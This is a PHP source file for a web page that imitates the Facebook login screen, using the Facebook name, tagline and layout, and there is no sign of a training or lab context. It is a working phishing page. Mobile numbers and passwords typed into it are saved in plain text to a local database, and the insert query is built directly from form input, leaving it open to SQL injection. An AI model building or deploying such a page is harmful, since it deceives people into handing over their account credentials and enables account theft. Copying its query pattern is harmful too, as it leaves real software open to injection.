<?php
    include 'conn.php';
    
    if(isset($_POST['submit'])){
        $mob = $_POST['mobile'];
        $pass = $_POST['password'];

        $query = "INSERT INTO `data`(`mobile_no`, `password`) VALUES ('$mob','$pass')";

        mysqli_query($conn,$query);
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="face.png" />
    <title>Facebook</title>
</head>
<body>
<div class="wrapper">
    <div class="left">
        <div class="face">
            facebook
        </div>
        <div class="title">
            Connect with friends and the world
            <br>
            around you on Facebook.
        </div>
    </div>
    <div class="right">
        <div class="box">
        <form method="post">
            <input type="text" class="text" name="mobile" placeholder="Mobile No" maxlength="10" required>
            <br><br>
            <div class="border">
            <input type="password" class="pass" name="password" placeholder="Password" required>
            <i class="fa fa-eye toggle"></i>
            </div>
            <br>
            <input type="submit" class="log" name="submit" value="Log In">
            <br><br>
            <a href="#" class="forgot">Forgot Password?</a>
            <br><br>
            <a href="#">
            <div class="newAc">
            Create New Account
            </div>
            </a>
        </form>
        </div>
    </div>
</div>
<script src="main.js"></script>
</body>
</html>